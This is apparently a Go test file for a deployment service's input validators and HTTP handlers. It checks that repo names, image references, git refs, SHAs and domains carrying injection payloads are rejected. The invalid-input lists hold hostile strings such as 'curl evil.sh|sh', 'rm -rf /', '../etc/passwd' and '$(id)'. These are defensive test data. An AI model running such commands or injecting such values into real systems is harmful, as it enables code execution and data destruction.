package project

import (
	"bytes"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestValidateRepoRef(t *testing.T) {
	valid := []string{
		"user4xn/shipdude",
		"owner/repo.name",
		"a/b_c-d",
		"User4XN/ShipDude",
	}
	for _, ref := range valid {
		if err := ValidateRepoRef(ref); err != nil {
			t.Errorf("expected %q valid, got error: %v", ref, err)
		}
	}

	invalid := []string{
		"",
		"owner",
		"x;id",
		"owner/repo;id",
		"owner/$(id)",
		"owner/repo\nrm -rf /",
		"owner/repo && curl evil.sh|sh",
		"owner/../etc/passwd",
		"/repo",
		"owner/repo/",
		"own er/repo",
		"owner/repo`id`",
		"owner/" + strings.Repeat("b", 200),
	}
	for _, ref := range invalid {
		if err := ValidateRepoRef(ref); err == nil {
			t.Errorf("expected %q rejected, but it passed", ref)
		}
	}
}

func TestValidateImageRef(t *testing.T) {
	valid := []string{
		"ghcr.io/user4xn/my-website:sha-abcdef",
		"ghcr.io/user4xn/app:latest",
		"ghcr.io/user4xn/app",
		"nginx:1.25",
	}
	for _, ref := range valid {
		if err := ValidateImageRef(ref); err != nil {
			t.Errorf("expected %q valid, got error: %v", ref, err)
		}
	}

	invalid := []string{
		"",
		"x;id",
		"ghcr.io/o/r:tag;rm -rf /",
		"ghcr.io/o/r:tag && curl evil",
		"`id`",
		"ghcr.io/../secret",
		"$(curl evil.sh)",
		"ghcr.io/o/r:tag\nid",
	}
	for _, ref := range invalid {
		if err := ValidateImageRef(ref); err == nil {
			t.Errorf("expected %q rejected, but it passed", ref)
		}
	}
}

func TestValidateGitRef(t *testing.T) {
	valid := []string{"main", "feature/x-1", "release/v1.2.3", "fix_deploy"}
	for _, ref := range valid {
		if err := ValidateGitRef(ref); err != nil {
			t.Errorf("expected %q valid, got error: %v", ref, err)
		}
	}

	invalid := []string{"", "main;id", "a..b", "-x", ".hidden", "main\nid", "main$(id)"}
	for _, ref := range invalid {
		if err := ValidateGitRef(ref); err == nil {
			t.Errorf("expected %q rejected, but it passed", ref)
		}
	}
}

func TestValidateSHA(t *testing.T) {
	valid := []string{"latest", "abcdef1", strings.Repeat("a", 40)}
	for _, sha := range valid {
		if err := ValidateSHA(sha); err != nil {
			t.Errorf("expected %q valid, got error: %v", sha, err)
		}
	}

	invalid := []string{"", "abc", "ABCDEF1", "abc;id", "abcdefg1", "abcdef1 "}
	for _, sha := range invalid {
		if err := ValidateSHA(sha); err == nil {
			t.Errorf("expected %q rejected, but it passed", sha)
		}
	}
}

func TestValidateDomain(t *testing.T) {
	valid := []string{"", "app.example.com", "sub.domain.co.id"}
	for _, d := range valid {
		if err := ValidateDomain(d); err != nil {
			t.Errorf("expected %q valid, got error: %v", d, err)
		}
	}

	// Nilai-nilai ini adalah upaya injeksi blok konfigurasi Caddyfile.
	invalid := []string{
		"a.com {\n}\nevil.com",
		"localhost",
		"a b.com",
		"http://a.com",
		"a.com;id",
		"*.a.com",
	}
	for _, d := range invalid {
		if err := ValidateDomain(d); err == nil {
			t.Errorf("expected %q rejected, but it passed", d)
		}
	}
}

func TestValidateDeployRequest(t *testing.T) {
	base := DeployRequest{
		GitHubRepo:   "user4xn/shipdude",
		GitHubBranch: "main",
		ProjectName:  "my-website",
		AppPort:      8080,
		Domain:       "app.example.com",
	}
	if err := ValidateDeployRequest(base); err != nil {
		t.Fatalf("expected baseline request valid, got: %v", err)
	}

	cases := map[string]DeployRequest{
		"repo injection":   {GitHubRepo: "x;id", GitHubBranch: "main", ProjectName: "p", AppPort: 8080},
		"branch injection": {GitHubRepo: "user4xn/shipdude", GitHubBranch: "main;id", ProjectName: "p", AppPort: 8080},
		"domain injection": {GitHubRepo: "user4xn/shipdude", GitHubBranch: "main", ProjectName: "p", AppPort: 8080, Domain: "a.com {\n}"},
		"empty name":       {GitHubRepo: "user4xn/shipdude", GitHubBranch: "main", ProjectName: "  ", AppPort: 8080},
		"port too big":     {GitHubRepo: "user4xn/shipdude", GitHubBranch: "main", ProjectName: "p", AppPort: 70000},
	}
	for name, req := range cases {
		if err := ValidateDeployRequest(req); err == nil {
			t.Errorf("%s: expected rejection, but it passed", name)
		}
	}
}

// TestDeployHandler_RejectsInjection memastikan input berbahaya ditolak sebagai
// 400 di lapisan HTTP, sebelum job deploy dibuat atau SSH disentuh.
func TestDeployHandler_RejectsInjection(t *testing.T) {
	h := newTestHandler(t)

	body := `{"ip_address":"10.0.0.5","ssh_port":22,"ssh_user":"root","github_repo":"x;id","github_branch":"main","project_name":"pwned","app_port":8080}`
	req := httptest.NewRequest(http.MethodPost, "/api/v1/projects/deploy", bytes.NewReader([]byte(body)))
	w := httptest.NewRecorder()
	h.Deploy(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for injected repo, got %d (body: %s)", w.Code, w.Body.String())
	}
}

// TestRollbackHandler_RejectsInjection memastikan target_image dari body tidak
// pernah sampai ke perintah shell.
func TestRollbackHandler_RejectsInjection(t *testing.T) {
	h := newTestHandler(t)

	body := `{"target_image":"ghcr.io/o/r:tag;id"}`
	req := withURLParam(
		httptest.NewRequest(http.MethodPost, "/api/v1/projects/1/rollback", bytes.NewBufferString(body)),
		"id", "1",
	)
	w := httptest.NewRecorder()
	h.Rollback(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for injected image, got %d (body: %s)", w.Code, w.Body.String())
	}
}

// TestTriggerHandler_RejectsInjection memastikan callback Actions tidak bisa
// dipakai menyuntikkan repo/SHA berbahaya.
func TestTriggerHandler_RejectsInjection(t *testing.T) {
	h := newTestHandler(t)

	for _, target := range []string{
		"/api/v1/projects/deploy-trigger?repo=" + "x;id",
		"/api/v1/projects/deploy-trigger?repo=user4xn/shipdude&sha=" + "abc;id",
	} {
		req := httptest.NewRequest(http.MethodPost, target, bytes.NewBufferString(`{"sha":"abc;id"}`))
		w := httptest.NewRecorder()
		h.Trigger(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("%s: expected 400, got %d (body: %s)", target, w.Code, w.Body.String())
		}
	}
}

// TestValidPayloadStillAccepted menjaga agar validasi tidak over-blocking:
// payload sah harus tetap diproses sampai titik "butuh token GitHub".
func TestValidPayloadStillAccepted(t *testing.T) {
	h := newTestHandler(t)

	body := fmt.Sprintf(`{"ip_address":"10.0.0.5","ssh_port":22,"ssh_user":"root","github_repo":"user4xn/shipdude","github_branch":"main","project_name":"ok-app","app_port":8080,"domain":"app.example.com","github_token":%q}`, "ghp_dummy")
	req := httptest.NewRequest(http.MethodPost, "/api/v1/projects/deploy", bytes.NewReader([]byte(body)))
	w := httptest.NewRecorder()
	h.Deploy(w, req)

	if w.Code == http.StatusBadRequest {
		t.Fatalf("valid payload must not be rejected with 400 (body: %s)", w.Body.String())
	}
}
